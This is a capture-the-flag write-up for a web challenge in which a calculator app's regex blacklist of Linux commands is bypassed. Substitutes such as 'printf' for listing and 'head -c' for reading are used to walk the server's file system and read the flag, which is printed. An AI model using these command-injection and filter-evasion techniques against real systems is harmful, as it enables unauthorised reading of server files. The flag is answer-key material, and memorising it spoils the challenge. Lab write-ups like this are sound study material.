# Calculator Evaluation

Web, 100

### Description

So, my friend got mad because you managed to read his secret. He went to update his website...

Find the new calculator app [here](challs.sieberrsec.tech:4588/calcv2.html).

P.S. He told me he recently learnt about regex. Not sure what that points to.


Original Challenge Author: xzy_10

Original Challenge Author: xzy_10

## Solution

### Inspecting Webpage

First, viewing the page source gives me this comment 
```
<html>
	<head>
		<link rel="stylesheet" href="styles.css">
	</head>
	<body>

		<h1>Calculator App V2!</h1>
		<h2>Updated to improve security!</h2>

		<form action="calcv2.php" method="get">
			Number to be added: <input type="text" name="value"><br>
		<input type="submit" value="Add!" class="button">
		</form>
		<!--
		OMG regex is sooooooo powerful! The | really makes it so easy to check for each linux command!
		All right! I have disabled the linux commands! I hope I have covered all of the commands though...
		-->
		</body>
</html>
```

### Using Alternative Linux Commands

My first thought was that it was a similar challenge from before, the `Calculator Evaluation` Challenge. I copied over my script and tried testing linux commands. I made some minor tweaks (not much, just formatting issues) and tested it.

```
> ls
ee my 
> !!!
<html>
<head>
  <link rel="stylesheet" href="styles.css">
</head>

<h1> 
Calculator App V2!
</h1>
<h3>No listing! Can't let you see my secrets!</h3>
> cat
(?^-?-^?)</h3><h3>A cat blocks your way! It's sleeping... Better not 
> echo
e!</h2><h3>Hey there!</h3><h4>Hey there!</h4><h5>Hey there!</h5><h6>He
> sh

> lmao

>
```

Looks like they don't give a proper result. The comment makes me think that maybe we can use alternative commands. I googled for an alternative to `ls` and tried it, which ended up working

```
> printf "%s\n" *
calcv2.html
calcv2.php
styles.css

> 
```

I also found a substitute for `cat` from [here](https://stackoverflow.com/questions/218912/linux-command-like-cat-to-read-a-specified-quantity-of-characters)

```
> head -c 100 styles.css
@import url('https://fonts.googleapis.com/css2?family=Hind:wght@500;600&display=swap');



h1 {

	fo
```

### Traversing the file system

I just used my 2 new useful commands to traverse everything

```
> printf "%s\n" ./*
./calcv2.html
./calcv2.php
./styles.css

> printf "%s\n" ../*
../calc-reval
../secrets1782956

> 

> printf "%s\n" ../*
../calc-reval
../secrets1782956

> printf "%s\n" ../secrets1782956*
../secrets1782956

> printf "%s\n" ../secrets1782956/*
../secrets1782956/flag

> head -c 1000 ../secrets1782956/flag
IRS{sAn1t1sE_3V3RYTH1NG!_n0T_Ju5T_th3_c0mM0n_0n35!}


> 
```

 Good 20 min challenge I guess. Most of the time was just admin and writing this writeup

## Flag

`IRS{sAn1t1sE_3V3RYTH1NG!_n0T_Ju5T_th3_c0mM0n_0n35!}`